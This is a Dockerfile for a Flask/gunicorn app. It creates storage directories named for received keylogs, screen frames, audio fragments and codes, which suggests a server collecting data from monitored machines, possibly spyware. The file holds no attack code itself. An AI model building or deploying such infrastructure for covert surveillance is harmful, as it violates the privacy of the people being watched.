# Use a Debian-slim Python base
FROM python:3.11-slim

# non-interactive apt
ENV DEBIAN_FRONTEND=noninteractive

# Set workdir
WORKDIR /app

# 1) Install OS/build deps (including Python dev headers) and ffmpeg for pydub
RUN apt-get update && \
    apt-get install -y --no-install-recommends \
      build-essential \
      python3-dev \
      libsndfile1 \
      ffmpeg \
    && rm -rf /var/lib/apt/lists/*

# 2) Upgrade pip, setuptools, wheel so PEP 517 backends work
RUN pip install --upgrade pip setuptools wheel

# Copy & install Python requirements
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

# Copy app code and create your asset dirs
COPY . .
RUN mkdir -p \
    assets/uploaded_files \
    assets/received_frames \
    assets/received_codes \
    assets/uploaded_audio_fragments \
    assets/received_keylogs

# Env vars
ENV PYTHONUNBUFFERED=1 \
    FLASK_APP=app.py \
    FLASK_ENV=production

EXPOSE 5000

# Launch with your factory
CMD ["gunicorn", "--bind", "0.0.0.0:5000", "app:create_app()"]
